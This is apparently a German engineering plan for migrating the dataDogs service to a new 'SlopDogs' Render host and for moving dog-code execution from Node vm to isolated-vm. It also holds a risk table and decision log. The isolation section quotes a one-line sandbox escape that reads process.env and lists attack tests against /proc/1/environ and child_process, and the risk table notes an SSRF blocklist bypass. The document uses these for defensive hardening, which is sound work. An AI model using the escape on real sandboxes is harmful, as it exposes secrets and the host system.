> 0. Neues Repo (10-0 legt es auf GitHub an, leer, z. B. `MartinSchmieschek/SlopDogs`; <neu-repo> = seine URL). Lotus: R2 ausfuehren (Repo-URLs in 55 `package.json`, `package.json:11`, UA-Strings `SlopDogs/0.2 (+https://github.com/<neu-repo>)`, `BACKLOG.md:93`) auf einem Zweig von `feature/slopdogs`, Beweis wie P2 (typecheck, StartupTest); dann den Endstand als **einen** Initial-Commit ohne Historie in das neue Repo (`git archive` des Baums -> frisches `git init` -> ein Commit `SlopDogs` -> push `main`). Pruefung: `git log --oneline` im neuen Repo = 1 Commit; Baum-Hash = Baum von `feature/slopdogs` + R2. Rueckweg: neues Repo loeschen, dataDogs unberuehrt.
> Folge fuer die Vorbedingung oben: Der Live-Test auf dem **alten** Dienst entfaellt nicht, er laeuft weiter aus `dataDogs` (`feature/slopdogs` -> `integration`, nur auf Wort des 10-0); der **neue** Dienst baut aus `<neu-repo>` Branch `main`.

1. Render: neuen Web Service anlegen (Name `slopdogs`, Region wie alt, **Repo `<neu-repo>`, Branch `main`**, Build `npm run render:integration:build`, Start `npm run start:integration:dist`, 512 MB). Render haengt ein Suffix an -> `<neu>` ist erst jetzt bekannt. Pruefung: Dienst existiert; der erste Build darf scheitern (Env fehlt). Rueckweg: Dienst loeschen.
2. Render: neue Postgres anlegen (Empfehlung 8.2); `DATABASE_URL` notieren. Pruefung: "available". Rueckweg: loeschen.
3. Env auf den neuen Dienst (Quelle: alter Dienst per Export + `.env.integration.example`): `DATABASE_URL` (neu; `CACHE_/JSON_STORAGE_/AUTH_DATABASE_URL` leer -> `dbEnv.cjs` spiegelt), `DB_CONNECTION_LIMIT=4`, `DB_POOL_TIMEOUT`, `NODE_ENV=integration`, `MAX_CONCURRENT_HEAVY_REQUESTS=8`, `HEAVY_REQUEST_QUEUE_TIMEOUT_MS`, **`MAX_CONCURRENT_PUBLIC_RUNS=4`**, `PUBLIC_RUN_QUEUE_TIMEOUT_MS`, `WAVE_CONCURRENCY=4`, `DOG_WORKER_MAX_HEAP_MB=64`, `CACHE_PRUNE_INTERVAL_MS`, `KENNEL_CALL_FLUSH_MS`, `KENNEL_STATS_MEMO_MS`, `LANDING_MEMO_MS`, `WS_*`, `OVERPASS_*` (+`OVERPASS_USER_AGENT` mit neuem Namen), API-Schluessel (`EBIRD_API_KEY`, `WINDY_API_KEY`, `ORS_API_KEYS`, `HUE_*`, `CLAUDE_API_*`), `SESSION_SECRET` (neu erzeugen), `MCP_TOKEN_SIGNING_KEY` (neu erzeugen), `MCP_AUTH_REQUIRED=true`, `GOOGLE_OAUTH_CLIENT_ID/SECRET` (gleich), **`GOOGLE_OAUTH_REDIRECT_BASE=https://<neu>`**, **`MCP_BASE_URL=https://<neu>`**, `PUBLIC_API_BASE_URL` leer (`inject-ui-api-base.cjs:61-63`), `CORS_*` leer, **`SLOPDOGS_VM_TIMEOUT_MS`, `SLOPDOGS_MCP_RATE_LIMIT`, `SLOPDOGS_LOG_LEVEL` statt `DATADOGS_*`**, `LEGACY_KENNEL_REDIRECT=1`, **`KEYSTORE_MASTER_KEY_V1`** (neu erzeugen; nie `KEYSTORE_SUPERUSER_OWNER` auf integration). Keys aus der alten DB wandern nicht mit (8.10) — Nutzer tragen sie auf `https://<neu>/auth/keys` neu ein. Pruefung: Env-Liste des alten Dienstes Zeile fuer Zeile abgehakt. Rueckweg: —.
4. Google Cloud Console: `https://<neu>/auth/google/callback` als Redirect-URI ergaenzen; alte URI vorerst behalten. Pruefung: nach Schritt 5 Login-Roundtrip `/auth/google/login` -> `/auth/me` `authenticated:true`. Rueckweg: alte URI ist noch da.
5. Manual Deploy des neuen Dienstes; `prisma:sync:integration` legt das Schema an (inkl. `KennelCallDaily`, `KennelRating`, P4b/P4c-Tabellen), Seeds laufen beim Start (`main.ts:68`). Pruefung (lesend, je ein Aufruf): `GET /.well-known/oauth-authorization-server` -> issuer `https://<neu>`; `GET /actions/openapi.json` -> `servers[0].url` `https://<neu>/actions`; `GET /` -> Landing-HTML; `GET /robots.txt`; `POST /mcp initialize` -> `serverInfo.name slopdogs`; `GET /k/<seed-kennel>` -> HTML (ein Lauf, kein Pollen); `GET /<seed-kennel>` -> 308; `GET /api/landing` -> JSON; Log ohne Zeile `env alias in use`. Rueckweg: Dienst pausieren; der alte laeuft weiter.
6. PATs neu: auf `https://<neu>/auth/tokens` einloggen, Token erzeugen (1 Jahr, `personal-tokens.ts:17`), in die Lotus-Kammer legen (Regel: `.enc` nie per Pipe editieren). Pruefung: `POST /actions/health_check` mit Bearer -> 200 mit `stats`. Rueckweg: `/auth/tokens/:jti/revoke`.
7. `~/.claude.json`: `Copy-Item ~/.claude.json ~/.claude.json.bak-<datum>`; `claude mcp remove datadogs-int`; `claude mcp add --transport http slopdogs-int https://<neu>/mcp --header "Authorization: Bearer <PAT>"` (Timeout 900000 wie heute nachtragen). Pruefung: `claude mcp list` zeigt `slopdogs-int` verbunden; Tool-IDs heissen `mcp__slopdogs-int__*`. Rueckweg: Backup zurueck.
8. `~/.claude/settings.json` und `settings.local.json`: Backup; Node-Replace `mcp__datadogs-int` -> `mcp__slopdogs-int`, `datadogs-9qde.onrender.com` -> `<neu-host>` (kein sed; Skript wie `rename.cjs`, JSON bleibt gueltig). Pruefung: `Select-String -Pattern 'datadogs-int' -Path <beide>` = 0; naechste Sitzung fragt bei `list_kennels` nicht nach Freigabe. Rueckweg: Backups zurueck.
9. dogdoc-Skill (lokal, git-frei — vorher kopieren): `SKILL.md:32` Host, `:33` `…/k/xyz`, `:209` sink `https://<neu>/k/doc-track`, `:224` `…/k/doc-track?doc=`, `:367` curl `…/k/<kennel>`; `beispiel/README.md:4`; `beispiel/3-shell.js:22`. Den Kennel `doc-track` auf dem neuen Dienst neu bauen (er lebt in der alten DB). Pruefung: `curl -s https://<neu>/k/doc-track?doc=probe` liefert Body (`skill.md:98`: Body pruefen, nicht Status). Rueckweg: Kopie zurueck.
10. ki-fruechte (eigenes Repo, eigener Commit dort): `builder.js:103` TRUSTED_HOSTS auf `/(^|\.)<neu-host>$/i` umstellen (alter Host faellt mit Schritt 12), `:105` Basis; `sitzung.js:36` und `:2137,:2150` `basis + '/k/' + …`; `vorlagen/veroeffentlichen.js:15,:267,:615,:663,:697` `${basis}/k/…`; `test/sitzung/seiten.js:36,94`, `sitzung_test.js:35,2183` (wss-Host), `werkstatt_pool_test.js:23`, `modell_test.js:359`; `prompts/builder.md:39`, `.prompts/_builder.txt:39`; Env `KIF_DATADOGS_TOKEN` = neue PAT. Pruefung: ki-fruechte-Tests gruen (Memory: 515), ein echter Bau liefert eine `https://<neu>/k/…`-URL. Rueckweg: `git revert` in ki-fruechte.
11. Eigene Notizen: `~/.claude/skills/dataDog/skill.md` (`datadogs-int`, `datadogs://skill`), `lotus/frames/vauban/SKILL.md`, `~/.claude/lotus/kifruechte-design/datadogs-sitzung-0913.md`, Memory-md. Pruefung: `grep -rl 'datadogs-int\|datadogs-9qde\|datadogs://' ~/.claude/skills ~/.claude/lotus ~/.claude/projects --include=*.md` = 0 (Sitzungsprotokolle ausgenommen).
12. Alter Dienst abschalten (8.1 entschieden, kein Weiterleiter): im Render-Dashboard den Dienst `datadogs-9qde` suspendieren (nicht loeschen — Rueckweg), alte Postgres vorerst behalten. Pruefung: `curl -sI https://datadogs-9qde.onrender.com/` antwortet nicht mehr mit 200 (Render-Suspend-Seite oder Timeout); `claude mcp list` zeigt nur `slopdogs-int`. Rueckweg: Dienst wieder aufnehmen (Resume) — funktioniert, solange Schritt 14 nicht gelaufen ist.
13. **Entfaellt als Rename (10-0: neues Repo, siehe Schritt 0).** Uebrig bleibt: lokal einen frischen Klon von `<neu-repo>` als Arbeitsort; `dataDogs` auf GitHub archivieren (Settings -> Archive), sobald Schritt 12 gelaufen ist. Alter Text, nur zur Nachvollziehbarkeit: GitHub: Repo `MartinSchmieschek/dataDogs` -> `SlopDogs` umbenennen (GitHub legt Redirects an); lokal `git remote set-url origin https://github.com/MartinSchmieschek/SlopDogs.git` in allen Worktrees; Render-Dienste: Repo-Link pruefen, einmal Manual Deploy. Danach R2 aus P2 ausfuehren (`node rename.cjs --only R2`: 55 `package.json` + UA-URLs), Commit `chore: repository URL -> SlopDogs`. Pruefung: `git fetch` gruen; Render-Build gruen; `git grep -c 'MartinSchmieschek/dataDogs'` = 0. Rueckweg: Rename zurueck (GitHub erlaubt es).
14. Nach einer Woche fehlerfreiem Betrieb des neuen Dienstes (gesetzt, nicht 30 Tage — es gibt keinen Weiterleiter mehr, der Zeit braucht): alten Dienst und alte Postgres loeschen; Alias-Leser aus P2 entfernen (Env, Resource-URI, Cookie, Neg-Cache-Marker); `LEGACY_KENNEL_REDIRECT=0` auf dem neuen Dienst, sobald Schritte 9-10 erledigt sind; `.env.example:169` auf den neuen Host. Pruefung: `git grep -i datadog -- ':!CHANGELOG.md'` = nur historische Kommentare ("vormals dataDogs") und die Landing-Fusszeile. Rueckweg: keiner mehr — deshalb die Woche.

Reihenfolge-Zwang: 1-5 vor 6; 6 vor 7-11; 12 nach 7-11 (erst wenn jeder Konsument auf `<neu>` zeigt); 13 unabhaengig, aber vor R2; 14 zuletzt.

**Abnahmekriterien (messbar).** Alle Pruefungen 1-13 dokumentiert (Kommando + Ausgabe) in `docs/slopdogs/UMZUG-<datum>.md` (einzige weitere Datei, die P7 im Repo anlegt); `claude mcp list` gruen; ki-fruechte 515 Tests gruen; dogdoc-Probe liefert Body; alter Dienst suspendiert.

**Commit-Schnitt.** Im Repo nur zwei Commits: `chore: repository URL -> SlopDogs` (Schritt 13, R2) und `docs: Umzugsprotokoll` (Schritt 14). Alles andere ist Handarbeit ausserhalb des Repos.

---

### P8 — Echte Dog-Isolation mit isolated-vm (10-0 2026-09-27, vor der offenen Beta)

**Warum.** Node's `vm` ist kein Sicherheits-Sandkasten. Dog-Code bricht aus dem VM-Kontext in den Worker-Realm aus (`fetch.constructor.constructor("return process.env")()`) und erreicht `process`, `require`, `fs`, `child_process`. Die Haertung von 2026-09-27 (Env-Scrub + `env:{}` + `execArgv:[]` + Neutralisieren von `process.mainModule/binding/dlopen`) schliesst die praktischen Wege zu den Geheimnissen und zum Dateisystem — sie ist Defense-in-Depth fuer die GESCHLOSSENE Beta, aber KEINE Grenze (V8 hat weitere Primordials). vm2 ist keine Option (2023 eingestellt, vom Autor als unsicher erklaert). Der echte Boden ist **isolated-vm**: ein getrennter V8-Isolate ohne `process`/`require`/Node-Built-ins; erlaubte Faehigkeiten werden einzeln ueber die Isolate-Grenze gereicht.

**Reihenfolge.** Nach dem Haertungs-Fix in `main`, VOR dem weiten Oeffnen der Beta.

**Vorstufe (Aufklaerung).** Boreal kartiert JEDE heutige Bridge-/Kontext-Stelle, die in den `vm`-Kontext gereicht wird, damit beim Umbau keine vergessen wird: `guardedFetch`, `console`-Bruecke, `jsonStore`-Bridge, `keys.fetch` (P4c), die Parent-Yields/`contextObj`, die Egress-Blocklist (R30-nah), Timeout/Heap-Limits, der Result-Rueckweg (heute JSON-Roundtrip). Quelle: `packages/core/src/dogs/SerializedDog.ts` (createContext, makeBridgeProxy, SANDBOX_WORKER_SOURCE), `KennelRun.ts`, `services/keysCapability.ts`, `services/wavesRedaction.ts`.

**Umbau.** Dog-Ausfuehrung von `worker_threads` + `vm.runInContext` auf `isolated-vm` umstellen: je Lauf ein Isolate mit Memory-Limit (ersetzt `resourceLimits`) und Timeout; Bridges als `ivm.Reference`/`Callback` ueber die Grenze; im Isolate KEIN `process`, KEIN `require`. Native Abhaengigkeit `isolated-vm` (kompiliert im `render:integration:build` — auf Render pruefen; Fallback/Bauzeit beachten). Result weiter als reine Daten zurueck.

**Beweis.** Die Angriffstests aus dem Haertungs-Fix (Env, `fs` lesen/schreiben, `/proc/1/environ`, `child_process`, `process`-Ausbruch) muessen im Isolate strukturell fehlschlagen — nicht per Neutralisierung, sondern weil `process`/`require` gar nicht existieren. Regression: alle Seed-Dogs, WebSocket-Lobby, jsonStore, keys.fetch, Snapshots laufen weiter. StartupTest + `test:mcp:integration` gruen.

**Aufwand.** Eigener, sorgfaeltiger Auftrag (Kern-Ausfuehrungspfad + alle Bridges + Build). Nicht nebenbei.

---

## 5. Beweis vor jedem Commit (Kurzfassung)

```
npm run typecheck                                   # Core, Dogs, Server
npm run check:integration-dogs
npm run lint:docs                                   # ab P3 Commit 8: Pfade in Texten gegen die Routentabelle (Teil von npm test)
npm run ui:build                                    # bei UI-Aenderung; Budgets: initial 500 kB/1 MB, anyComponentStyle 20/24 kB (angular.json:73-83)
RUN_STARTUP_TESTS=1 npm start                       # StartupTest nach listen; neue Tests je Phase
npm run test:mcp:integration                        # gegen 127.0.0.1:3000, MCP_BEARER bei MCP_AUTH_REQUIRED=true
git status --porcelain                              # nur beabsichtigte Dateien
Freigabe 10-0 -> git commit (Identitaet Martin Schmieschek <Martin.Schmieschek@googlemail.com>, keine Co-Authored-By-Zeile)
```

---

## 6. Risiken und was nicht gemessen ist

| # | Risiko | Herkunft | Gegenmassnahme |
|---|---|---|---|
| R1 | P2 beruehrt ~330 Dateien; jeder parallel offene Branch kollidiert | gezaehlt (306 Scope-Dateien + T1/T3) | P2 in einer Sitzung, kein zweiter Branch offen; danach zuerst mergen |
| R2 | `npm install` nach dem Scope-Rename scheitert (postinstall baut 54 Pakete, `postinstall-run.cjs:4`) | gefolgert | Schritt 4 (Reste loeschen) vor Schritt 5; bei Fehler `packages/*/dist` erneut loeschen, `npm install` wiederholen |
| R3 | Public-Bremse 4 ist gesetzt, nicht gemessen; zu eng -> 503 fuer Besucher, zu weit -> Heap | ungemessen | Env-Schraube; P4-Zaehlung macht die Last sichtbar (`ranked30d`, `health_check.stats`) |
| R4 | Kompilierte Groesse von `kennel-list.component.scss` gegen 24 kB | ungemessen seit 4b10138 (Quelle 25.387 B gemessen; 211a805: 18,37 kB gemessen) | Datei bis P6 nicht anfassen; P6 U2 loescht sie; neue Komponenten mit eigenen Styles; `ui:build` ist der Beweis |
| R5 | Neuer Host entwertet alle PATs und bricht ki-fruechte TRUSTED_HOSTS, dogdoc, Claude-Konfiguration | gefolgert aus `jwt.ts:77-79`, `builder.js:103` | Runbook P7 Schritte 6-11 in Reihenfolge; alter Dienst wird abgeschaltet (8.1) |
| R6 | Zaehlerverlust bei SIGKILL/OOM bis 30 s | gerechnet | akzeptiert (Amar-Empfehlung 5); `KENNEL_CALL_FLUSH_MS` |
| R7 | Zwei Prozesse beim Deploy flushen gleichzeitig | gefolgert (`dbEnv.cjs:270-271`) | `ON CONFLICT … + excluded` (atomar) |
| R8 | Alt-Weiche macht aus jeder Bot-Probe zwei Antworten (308 + 404) | gefolgert | beide ohne DB; heute ist es ein DB-Lookup je Probe (`KennelRunHandler.ts:547`) — netto billiger |
| R9 | Kennel-Namen mit Punkt werden in P1 nicht gebremst | gefolgert | nur bis P3 |
| R10 | `mergeQueryParams` lowercased Werte (`channelId` "AbC" -> "abc") | gemessen im Code :90 | vorbestehend, nicht Teil von A030; notiert |
| R11 | Render-Kaltstart bis 150 s trifft auch die statische Landing (HTML kommt aus dem Prozess) | gemessen (Boreal G, Follie 1.5) | Landing zeigt `waking`; Wecker ausserhalb der Seite ist eine eigene Entscheidung (8.9) |
| R12 | Landing-Optik steht nicht — P5 Commit 1 wartet | offen | P1-P4c sind davon unabhaengig; P5 zuletzt vor P6 |
| R13 | ~~P4b-Speicherbedarf nur gerechnet~~ **gemessen** (4b.2): 403-406 Byte je pending-Eintrag, Deckel 10 000 ≈ 4 MB | gemessen 2026-09-26 (StartupTest 14) | erledigt |
| R30 | SSRF-Blocklist des nativen Worker-fetch per DNS-Rebinding umgehbar (Aufloesung beim Verbinden erneut); keys.fetch nicht betroffen (haelt die gepruefte Adresse fest) | gefunden P4c (Xata-Review), SerializedDog.ts ~315-349 | **bewusstes Restrisiko** (10-0 2026-09-26: "Restrisiko"); Fix-Weg bekannt: Dog-fetch ueber den Host-Weg wie keys.fetch |
| R18 | P4c: ein Key kann von fremdem Dog-Code gegen seine **erlaubte** Domain missbraucht werden (Kontingent verbrennen) | gefolgert (Nira T2) | Quota je Key; Allowlist Pflicht; kein Grant ohne Quota; Restrisiko bleibt und ist dokumentiert |
| R19 | P4c: Env-Leak (`KEYSTORE_MASTER_KEY_*`) zieht alle Keys | gefolgert (Nira T5) | Master-Key nur in Render-Env; Rotation V1 -> V2 vorbereitet; kein Klartext-Backup |
| R20 | P4c: `console` ueber die Bridge kostet einen RPC je Log-Zeile | gefolgert | Verbose in prod aus; Messpunkt: 20-Dog-Kennel mit je 10 Log-Zeilen, Wellendauer vorher/nachher |
| R21 | P1 Commit 4 aendert die Antwortform der Snapshot-Werkzeuge fuer Nicht-Owner (redigierte Dogs) | gefolgert | ki-fruechte und dataDog-Skill lesen Snapshots als PAT-User (meist Owner); Aenderung ist ein Sicherheitsfix und wird im Werkzeugtext genannt |
| R22 | P3.5 Startup-Guard: ist `MCP_AUTH_REQUIRED` auf dem int-Dashboard nicht `true`, startet der Dienst nach dem Deploy nicht mehr | gefolgert (Dashboard-Env aus dem Repo nicht lesbar, R15) | vor dem ersten int-Deploy nach P3.5 die Env pruefen; Exit-Code 78 mit klarer Logzeile; Rueckweg: Env setzen, Redeploy |
| R23 | P3.5 `filterReadable` -> `filterRunnable` in Listen zeigt run-only-Entitaeten erstmals Fremden (Name, Emoji, Beschreibung) | gefolgert (8.17) | Owner entscheidet je Entitaet zwischen `run-only` und `private`; Beschreibung ist Owner-Text |
| R24 | Fremder run-only-Dog laeuft im Kontext des Runners (jsonStore, spaeter Keys) | gefolgert (Nira 3, Nebenwirkung 1) | Keys nie fuer Dogs unterhalb READ (4c.4 Schritt 1); jsonStore-Namensraum je Dog; Version-Pin (8.15) |
| R25 | P6 ersetzt Liste, Editor-Seite und Palette; P3/P4-UI-Aenderungen in diesen Dateien sind Wegwerfarbeit, wenn sie ueber Pfade und Typen hinausgehen | gefolgert | Regel 6.6: sichtbare Flaechen entstehen nur in P6; P3 aendert nur Pfade, P4/P4b/P4c nur Modelle/Services |
| R26 | Doc-Lint erzeugt False-Positives (Pfade in Prosa, die keine Routen sind, z. B. `/k/` als Praefix-Erwaehnung) | gefolgert | Normalisierung und Ausnahme-Kommentar `<!-- lint:ignore -->` je Zeile; Lint zuerst im Warnmodus (P3 Commit 8 Teil 1), scharf nach Nullstand |
| R27 | Fonts: Body/Mono (IBM Plex) + je Look eine Display-Schrift = bis zu 6 woff2-Dateien; Groesse ungemessen | ungemessen | nur der aktive Look laedt seine Display-Schrift; Latin-Subset wie P5; Messung in U1 |
| R28 | Kontrastwerte in 6.2 sind von Follie gerechnet, nicht gemessen; Zine-Rot 4,9:1 ist knapp | gerechnet (Follie 2.2) | Nachmessen in U1 mit einem Kontrast-Werkzeug; Zine-Rot nie als Fliesstext |
| R29 | ~~Look c: Blueprint vs Mixtape~~ **erledigt**: c = Mixtape (10-0), Blueprint nur gesichert | gezaehlt (docs/slopdogs/landing/skin_c.js, skin_c_blueprint.js) | keine |
| R14 | Instanzzahl auf Render unbekannt; Code setzt Einzelinstanz voraus (Session-MemoryStore `sessions.ts:3`, Snapshot-Cache, ChannelHub) | ungemessen (kein render.yaml) | unveraendert; Zaehler ist instanzsicher |
| R15 | Welche `DATADOGS_*`-Env auf dem Render-Dashboard gesetzt sind, ist aus dem Repo nicht lesbar | ungemessen | Alias-Leser + Logzeile; Export aus der Render-UI in Schritt 3 |
| R16 | Lizenz/Groesse des Webfonts | ungemessen bis zur Vorlage | OFL-Verfahren in P5; 30 KB Grenze je Schnitt |
| R17 | `compare.ts:26` Selbstaufruf per HTTP | gefolgert (auf Render mit fremdem PORT tot) | P3 Commit 6 |

Nicht gemessen und in diesem Plan bewusst ohne Zahl: Last der Public-Pfade heute; Groesse der Landing vor dem Bau; Anzahl `mcp__datadogs-int`-Eintraege nach Boreals Zaehlung (50/13 gezaehlt am 25.09., kann sich taeglich aendern); Render-Kosten fuer einen zweiten Dienst ueber 30 Tage.

---

## 7. Gesamte Dateiliste (eine Zeile je Datei, Phase in Klammern)

`server-app/heavyRequestLimiter.ts` (P1, P3) · `server-app/createHttpApplication.ts` (P1, P4) · `seed-data/seed-helpers.ts` (P1) · `store/IStore.ts` (P1 pruefen) · `StartupTest.ts` (P1-P5) · `.env.example`, `.env.integration.example` (P1-P4) · alle Dateien aus P2-Inventar (P2) · `packages/core/src/kennelPaths.ts` (P3, neu aus kennelReservedNames.ts) · `packages/core/src/index.ts` (P3) · `api/routes/spaRouteConstants.ts` (P3) · `api/routes/KennelRunHandler.ts` (P3, P4) · `api/routes/KennelSwaggerHandler.ts` (P3, P4) · `services/swaggridAdapter.ts`, `packages/swaggrid/src/grimoire.ts` (P3) · `mcp/tools/kennels.ts` (P3, P4) · `api/KennelController.ts` (P3, P4) · `api/routes/KennelBundleHandler.ts` (P3) · `server-app/httpFrontEnd.builtUi.ts`, `httpFrontEnd.development.ts`, `httpFrontEndTypes.ts` (P3, P5) · `seed-data/kennels/compare.ts` (P3) · `ui-app/src/app/config/public-paths.ts` (P3, neu; `kennel-reserved-names.ts` geloescht) · `ui-app/src/app/components/kennel-form/kennel-form.component.ts` (P3) · `ui-app/src/app/pages/kennel-config/kennel-config.component.ts|.html` (P3) · `ui-app/src/app/pages/kennel-list/kennel-list.component.ts|.html` (P3 nur Pfade; `.scss` bis P6, dann geloescht) · `ui-app/src/app/services/kennel.service.ts` (P3, P4) · `ui-app/src/app/pages/waves-viewer/waves-viewer.component.ts|.html` (P3, P4) · `ui-app/src/app/pages/waves-viewer/components/waves-app-bar.component.html` (P3) · `ui-app/src/app/app.routes.ts` (P3) · `ui-app/proxy.conf.js` (P3) · README.md, ARCHITECTURE.md, AISkill.md, mcp/skill.md, BACKLOG.md (P2, P3, P4, P5) · `mcp/integration/mcp-gateway.integration.cjs` (P2, P3, P4) · `store/prisma/schema.prisma`, `store/prisma/schema.postgres.prisma` (P4, P4b, P4c) · `store/IKennelStatsStore.ts` (P4, neu) · `store/PrismaStore.ts` (P4) · `services/KennelCallCounter.ts`, `services/KennelStatsService.ts` (P4, neu) · `api/routes/KennelRatingHandler.ts`, `api/routes/LandingRouteHandler.ts` (P4, neu) · `api/routes/ListQuery.ts`, `api/routes/ConfigRouteHandler.ts` (P4) · `mcp/tools/snapshots.ts`, `mcp/tools/meta.ts`, `mcp/tools/types.ts` (P4) · `main.ts` (P4) · `ui-app/src/app/models/kennel-config.model.ts` (P4) · (`kennel-stats-badge`, `kennel-rating` entfallen — P6 `sd-plaque`, `sd-stars`, `sd-histogram`) · P3.5-Dateien siehe 3.5.10 · P4b-Dateien siehe 4b.13 · P4c-Dateien siehe 4c.11 · P6-Dateien siehe 6.10 · `services/wavesRedaction.ts` (P1, neu) · `api/routes/routeTable.ts`, `scripts/check-doc-paths.cjs` (P3, neu) · `api/routes/AclRouteHandler.ts` (P3.5, neu) · `public/landing/index.html`, `robots.txt`, `*.woff2`, `OFL.txt` (P5, neu) · `ui-app/public/favicon.svg` (P5, neu), `ui-app/src/index.html` (P5) · `docs/slopdogs/UMZUG-<datum>.md` (P7, neu). Nicht anfassen: `packages/core` ausser den benannten Stellen (`kennelPaths.ts` P3; `IDogRunObserver.ts`, `withDogCacheStats.ts`, `harverster.ts`, `KennelRun.ts`, `SerializedDog.ts` P4b/P4c — kein Schema, kein Pakt, kein Store), `seed-data` ausser P1/P3-Stellen und dem Landing-Seed (P5), `kennel-list.component.scss` bis P6.

---

## 8. Offene Entscheidungen fuer den 10-0 (je mit Empfehlung)

| # | Entscheidung | Optionen | Empfehlung | Begruendung |
|---|---|---|---|---|
| 8.1 | **ENTSCHIEDEN 2026-09-25 (10-0): neuer Dienst; sobald er laeuft, wird der alte abgeschaltet — kein 30-Tage-Weiterleiter.** Folge: P7 Schritt 12 = Abschalten statt Weiterleiter, alte Links (dogdoc-Berichte, ki-fruechte) sterben mit dem Abschalten. Alter Text: Alter Render-Dienst nach dem Umzug | (a) 30 Tage als Weiterleiter (308), dann aus; (b) sofort aus | **(a)** | dogdoc-Berichte und ki-fruechte-Links wurden an Menschen gegeben (Memory: Marc Bracke, PO-Berichte); ein toter Link ist ein toter Bericht. Kosten: ein zweiter Render-Dienst 30 Tage (Betrag ungemessen); der Weiterleiter braucht keine DB. |
| 8.2 | **ENTSCHIEDEN (10-0): Daten-Wipe ist ok — neue Postgres, keine Uebernahme.** Alter Text: Postgres fuer den neuen Dienst | (a) neue Postgres; (b) alte teilen | **(a)** | DB ist wegwerfbar; geteilt teilen sich alt und neu einen Pool (4 Clients x 4, `dbEnv.cjs`) und der Negativ-Cache-Alias muesste laenger leben; neu heisst: alter Dienst bleibt bis Schritt 12 unangetastet lauffaehig. |
| 8.3 | **ENTSCHIEDEN (10-0): Host-Umzug, wenn alles fertig ist (nach der letzten Phase).** Alter Text: Zeitpunkt des Host-Umzugs | (a) nach P5, erst Live-Test auf dem alten Dienst, dann neuer Dienst; (b) neuer Dienst sofort nach P2; (c) mit P3 | **(a)** | Eine Variable je Schritt: die Aliase aus P2 lassen den neuen Code auf dem alten Dienst laufen; so wird der Code getestet, bevor Host, DB, PATs und Google-Konsole wechseln. (b) wuerde PATs zweimal erneuern (Code-Bugs und Host gleichzeitig). |
| 8.4 | Void-Start (Baubeginn) | (a) sofort nach Freigabe dieses Plans mit P1, P2 in einer eigenen Sitzung; (b) warten auf offene Entscheidungen | **(a)** | Alle Spezifikationen liegen vor; P1-P4c brauchen keine der offenen Entscheidungen ausser 8.15/8.16 (P3.5, Empfehlung steht) und 8.5 (Merge vor P3). Empfohlene Sitzungen: S1 = P1; S2 = P2 allein; S3 = P3 (+ Merge 8.5 vorweg); S4 = P3.5; S5 = P4; S6 = P4b; S7 = P4c; S8 = P5; S9-S11 = P6 U1-U8 (nach 8.18-8.21); S12 = P7 mit dem 10-0. |
| 8.5 | `fix/prisma-connection-pool` (78ba628 Monaco-Lazy-Load, f306a17 bg1.avif) in `feature/slopdogs` mergen | (a) jetzt vor P3 (UI-Dateien ueberlappen: `kennel-config`, `waves-json-editor`, `index.html`); (b) erst wenn die Vorlage `bg1` braucht; (c) nie auf diesem Branch | **(a)** | Der Branch wurde vom 10-0 "fuer den naechsten int-Deploy" vorgesehen; spaeter kollidieren die UI-Dateien mit P3/P4. Bedingung: 10-0 hat ihn auf int getestet. |
| 8.6 | **AUFGELOEST durch Follies UI-Entwurf (7.10): Inspector-Tab `rating`; der Kopf zeigt nur das Aggregat** (P6 U4). Alter Text: Ort des Rating-Widgets im Viewer | (a) Inspector-Tab; (b) App-Bar-Kopf | (a) | Der Kopf hat mit `[Run]` schon seine Akzentflaeche; interaktive Sterne dort waeren die dritte (Akzent-Budget 6.2). |
| 8.7 | P4b: Zaehlgranularitaet und Referenzquelle | durch Amar beantwortet: ein Dog zaehlt je Season genau einmal (Memo in `collectYield`, `abstractHuntingDog.ts:316-321`); Mimics mit lineageId zaehlen, frische Platzhalter nicht; Referenzen aus `dogIds`/parents der Kopfversionen, gemessene Nutzung getrennt in `DogCallDaily` | **so uebernehmen** (4b.2, 4b.5) | keine Rueckfrage mehr noetig; nur Kenntnisnahme. |
| 8.8 | P4c: Owner-Key in oeffentlichen Kennels (`kennelGrants`) | (a) Opt-in je Key mit Pflicht-`quotaPerDay`, Default aus; (b) nicht bauen | **(a)** (Nira) | Ohne Grant kann ein anonymer Besucher nie fremde Schluessel verbrauchen; mit Grant zahlt der Owner bewusst und gedeckelt. Restrisiko: Missbrauch gegen die erlaubte Domain bis zur Quota (Nira T2). Kosten: P4c Commit 6. |
| 8.9 | Globaler Egress-Filter (SSRF-Schutz) fuer den nativen Worker-`fetch` (Nira L6) | (a) mitnehmen als **Blocklist privater Netze** (127/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1, fc00::/7) im Worker-`fetch`-Wrapper; (b) nicht bauen | **(a)** — ausdruecklich als Blocklist, **nicht** als Allowlist | Bestehende Dogs rufen viele externe APIs (Open-Meteo, Overpass, Nominatim, MOTIS, …, 65 API-Clients gezaehlt); eine Allowlist wuerde den Bestand brechen, eine Blocklist privater Netze bricht nichts und schliesst SSRF auf den Render-Container und die Postgres. Innerhalb von `keys.fetch` gilt die Sperre ohnehin (4c.4). |
| 8.10 | Keys gehen bei DB-Reset verloren | (a) bestaetigen, UI-Hinweis, kein Backup; (b) Export/Backup-Weg bauen | **(a)** (Nira, Lotus) | DB ist wegwerfbar; ein Klartext-Backup waere die groessere Leck-Flaeche; der Nutzer bringt seinen Key mit und traegt ihn neu ein. |
| 8.11 | Wecker gegen den Render-Kaltstart (Keep-alive ausserhalb der Seite) | (a) keiner; (b) externer Ping alle n Minuten | keine Empfehlung ohne Kosten-/Plan-Wissen; die Landing geht von kalt aus | ki-fruechte pingt heute `HEAD /` (`builder.js:113,1028`) nur waehrend eigener Laeufe. |
| 8.12 | Seed-Beschreibungen mit ASCII-Umlauten ("Luftqualitaet") auf der Landing | (a) Seeds bereinigen (`seed-data/kennels/*.ts`); (b) so lassen | **(a)**, kleiner eigener Commit vor P5 | auf einer Landing liest es sich als Tippfehler (Follie 8); Kosten: Textaenderung in Seeds, neue Version je Kennel beim naechsten Boot. |
| 8.13 | **ENTSCHIEDEN (10-0): Englisch** — Landing und App-UI; die Empfehlung (a) unten ist damit hinfaellig. Alter Text: Landing-Sprache | (a) Deutsch; (b) Englisch | **(a)** — `lang="de"`, UI-Chrome deutsch (Follie 1.3); EN-Schalter spaeter | gilt auch fuer die neue Vorlage, sofern der 10-0 nicht anders entscheidet. |
| 8.14 | "Data Hunt" | streichen (R8) — bereits im Plan | — | ein Name (Follie 2.3). |
